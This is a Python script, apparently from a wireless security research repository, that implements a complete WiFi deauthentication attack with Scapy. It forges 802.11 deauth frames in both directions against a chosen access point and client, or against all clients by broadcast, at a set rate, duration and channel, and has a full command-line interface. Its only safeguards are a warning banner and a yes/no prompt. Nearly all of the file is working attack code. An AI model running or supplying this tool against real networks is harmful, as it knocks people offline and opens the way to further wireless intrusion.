#!/usr/bin/env python3
"""
WiFi Deauthentication Attack - Python 3.8 Compatible Implementation
====================================================================

This version is compatible with Python 3.8+ (Ubuntu 20.04, Debian 10, etc.)
Differences from 3.10+ version:
  - Uses typing.Optional instead of | union syntax
  - Uses if/elif chains instead of match/case
  - Compatible with older Scapy versions

For modern Python features, see python310/ or python311plus/ versions.

**WARNING**: This tool is for AUTHORIZED TESTING ONLY.

Requirements:
    - Python 3.8+
    - Scapy 2.4.5+
    - WiFi adapter in monitor mode
    - Root/sudo privileges

Author: Wireless Security Research
License: Educational Use Only
Python Version: 3.8+ (maximum compatibility)
"""

import sys
import time
import argparse
import signal
from dataclasses import dataclass
from typing import Optional  # Python 3.8 compatibility
import os

# Scapy imports
try:
    from scapy.all import (
        RadioTap, Dot11, Dot11Deauth,
        sendp, conf
    )
except ImportError:
    print("ERROR: Scapy not installed. Run: pip install scapy")
    sys.exit(1)

# ============================================================================
# Configuration & Constants
# ============================================================================

@dataclass
class DeauthConfig:
    """Attack configuration parameters"""
    interface: str
    bssid: str
    client: Optional[str] = None  # Python 3.8: Use Optional instead of | None
    broadcast: bool = False
    reason: int = 7
    count: Optional[int] = None
    duration: Optional[int] = None
    rate: float = 10.0
    channel: Optional[int] = None
    capture: bool = False
    verbose: bool = True


DEAUTH_REASONS = {
    1: "Unspecified reason",
    2: "Previous authentication no longer valid",
    3: "Deauthenticated because sending STA is leaving (or has left) IBSS or ESS",
    4: "Disassociated due to inactivity",
    5: "Disassociated because AP is unable to handle all currently associated STAs",
    6: "Class 2 frame received from nonauthenticated STA",
    7: "Class 3 frame received from nonassociated STA",
    8: "Disassociated because sending STA is leaving (or has left) BSS",
}

# ============================================================================
# Attack Implementation
# ============================================================================

class WiFiDeauthAttack:
    """WiFi Deauthentication Attack Implementation"""

    def __init__(self, config: DeauthConfig):
        self.config = config
        self.packets_sent = 0
        self.running = False
        self.start_time = 0.0

        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)

    def _signal_handler(self, signum, frame):
        """Handle Ctrl+C for graceful shutdown"""
        print(f"\n[!] Caught signal {signum}, shutting down...")
        self.running = False

    def _validate_config(self) -> bool:
        """Validate attack configuration"""
        if os.geteuid() != 0:
            print("[!] ERROR: This script requires root privileges")
            return False

        if not os.path.exists(f"/sys/class/net/{self.config.interface}"):
            print(f"[!] ERROR: Interface {self.config.interface} not found")
            return False

        if not self._is_valid_mac(self.config.bssid):
            print(f"[!] ERROR: Invalid BSSID format: {self.config.bssid}")
            return False

        if self.config.client and not self._is_valid_mac(self.config.client):
            print(f"[!] ERROR: Invalid client MAC format: {self.config.client}")
            return False

        if self.config.count is None and self.config.duration is None:
            print("[!] ERROR: Must specify either --count or --duration")
            return False

        return True

    @staticmethod
    def _is_valid_mac(mac: str) -> bool:
        """Validate MAC address format"""
        parts = mac.split(':')
        if len(parts) != 6:
            return False
        try:
            [int(x, 16) for x in parts]
            return True
        except ValueError:
            return False

    def _craft_deauth_packet(self, target_mac: str) -> bytes:
        """
        Craft 802.11 deauthentication frame

        Args:
            target_mac: Target client MAC address (or broadcast)

        Returns:
            Raw packet bytes
        """
        radiotap = RadioTap()
        dot11 = Dot11(
            addr1=target_mac,
            addr2=self.config.bssid,
            addr3=self.config.bssid
        )
        deauth = Dot11Deauth(reason=self.config.reason)
        packet = radiotap / dot11 / deauth
        return packet

    def _send_deauth_pair(self, client_mac: str) -> None:
        """Send deauth in both directions (AP→Client and Client→AP)"""
        # AP → Client
        packet1 = self._craft_deauth_packet(client_mac)
        sendp(packet1, iface=self.config.interface, verbose=False)

        # Client → AP
        radiotap = RadioTap()
        dot11 = Dot11(
            addr1=self.config.bssid,
            addr2=client_mac,
            addr3=self.config.bssid
        )
        deauth = Dot11Deauth(reason=self.config.reason)
        packet2 = radiotap / dot11 / deauth
        sendp(packet2, iface=self.config.interface, verbose=False)

        self.packets_sent += 2

    def _print_status(self) -> None:
        """Print attack statistics"""
        elapsed = time.time() - self.start_time
        rate = self.packets_sent / elapsed if elapsed > 0 else 0
        print(f"\r[*] Sent: {self.packets_sent} packets | "
              f"Rate: {rate:.1f} pps | "
              f"Elapsed: {elapsed:.1f}s", end='', flush=True)

    def run(self) -> int:
        """Execute deauthentication attack"""
        if not self._validate_config():
            return 1

        if not self._request_authorization():
            print("[!] Attack cancelled by user")
            return 1

        self._print_attack_info()

        conf.verb = 0

        if self.config.channel:
            os.system(f"iw dev {self.config.interface} set channel {self.config.channel}")

        target_mac = "ff:ff:ff:ff:ff:ff" if self.config.broadcast else self.config.client

        self.running = True
        self.start_time = time.time()
        packet_count = 0

        try:
            while self.running:
                self._send_deauth_pair(target_mac)
                packet_count += 1

                if self.config.count and packet_count >= self.config.count:
                    break

                if self.config.duration:
                    elapsed = time.time() - self.start_time
                    if elapsed >= self.config.duration:
                        break

                if self.config.rate > 0:
                    time.sleep(1.0 / self.config.rate)

                if packet_count % 10 == 0 and self.config.verbose:
                    self._print_status()

        except KeyboardInterrupt:
            print("\n[!] Attack interrupted by user")
        except Exception as e:
            print(f"\n[!] ERROR: {e}")
            return 1
        finally:
            self._print_final_stats()

        return 0

    def _request_authorization(self) -> bool:
        """Request user confirmation before attacking"""
        print("\n" + "="*70)
        print("  WARNING: AUTHORIZATION REQUIRED")
        print("="*70)
        print("This tool will send deauthentication frames that will disconnect")
        print("wireless clients from the specified access point.")
        print("")
        print("You MUST have:")
        print("  1. Written authorization to test this network")
        print("  2. A controlled lab environment, OR")
        print("  3. Explicit permission from the network owner")
        print("="*70)

        response = input("\nDo you have authorization to proceed? (yes/NO): ")
        return response.lower() in ['yes', 'y']

    def _print_attack_info(self) -> None:
        """Display attack configuration"""
        print("\n" + "="*70)
        print("  WiFi Deauthentication Attack - Configuration")
        print("="*70)
        print(f"Interface:       {self.config.interface}")
        print(f"Target BSSID:    {self.config.bssid}")
        print(f"Target Client:   {self.config.client or 'BROADCAST (all clients)'}")
        print(f"Reason Code:     {self.config.reason} - {DEAUTH_REASONS.get(self.config.reason, 'Unknown')}")

        # Python 3.8: Use if/elif instead of match/case
        if self.config.count and not self.config.duration:
            mode = f"Count-based ({self.config.count} packets)"
        elif self.config.duration and not self.config.count:
            mode = f"Duration-based ({self.config.duration} seconds)"
        elif self.config.count and self.config.duration:
            mode = f"Hybrid ({self.config.count} packets OR {self.config.duration} seconds)"
        else:
            mode = "Unknown"

        print(f"Attack Mode:     {mode}")
        print(f"Rate:            {self.config.rate} packets/second")
        print(f"Channel:         {self.config.channel or 'Auto (use current)'}")
        print("="*70 + "\n")

    def _print_final_stats(self) -> None:
        """Display final attack statistics"""
        elapsed = time.time() - self.start_time
        avg_rate = self.packets_sent / elapsed if elapsed > 0 else 0

        print("\n" + "="*70)
        print("  Attack Completed - Statistics")
        print("="*70)
        print(f"Total Packets:   {self.packets_sent}")
        print(f"Duration:        {elapsed:.2f} seconds")
        print(f"Average Rate:    {avg_rate:.2f} packets/second")
        print("="*70 + "\n")


# ============================================================================
# CLI Interface
# ============================================================================

def parse_arguments() -> argparse.Namespace:
    """Parse command-line arguments"""
    parser = argparse.ArgumentParser(
        description="WiFi Deauthentication Attack (Python 3.8 Compatible)",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    parser.add_argument('-i', '--interface', required=True,
                       help='WiFi interface in monitor mode')
    parser.add_argument('-b', '--bssid', required=True,
                       help='Target AP BSSID (MAC address)')

    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument('-c', '--client', help='Target client MAC address')
    target_group.add_argument('--broadcast', action='store_true',
                             help='Target all clients')

    parser.add_argument('--reason', type=int, default=7, choices=range(1, 9),
                       help='Deauth reason code (default: 7)')
    parser.add_argument('-n', '--count', type=int,
                       help='Number of deauth packets')
    parser.add_argument('-d', '--duration', type=int,
                       help='Attack duration in seconds')
    parser.add_argument('-r', '--rate', type=float, default=10.0,
                       help='Packets per second (default: 10)')
    parser.add_argument('--channel', type=int, help='WiFi channel')
    parser.add_argument('--capture', action='store_true',
                       help='Capture traffic during attack')
    parser.add_argument('-q', '--quiet', action='store_true',
                       help='Quiet mode')

    return parser.parse_args()


def main() -> int:
    """Main entry point"""
    args = parse_arguments()

    config = DeauthConfig(
        interface=args.interface,
        bssid=args.bssid,
        client=args.client,
        broadcast=args.broadcast,
        reason=args.reason,
        count=args.count,
        duration=args.duration,
        rate=args.rate,
        channel=args.channel,
        capture=args.capture,
        verbose=not args.quiet
    )

    attack = WiFiDeauthAttack(config)
    return attack.run()


if __name__ == '__main__':
    sys.exit(main())
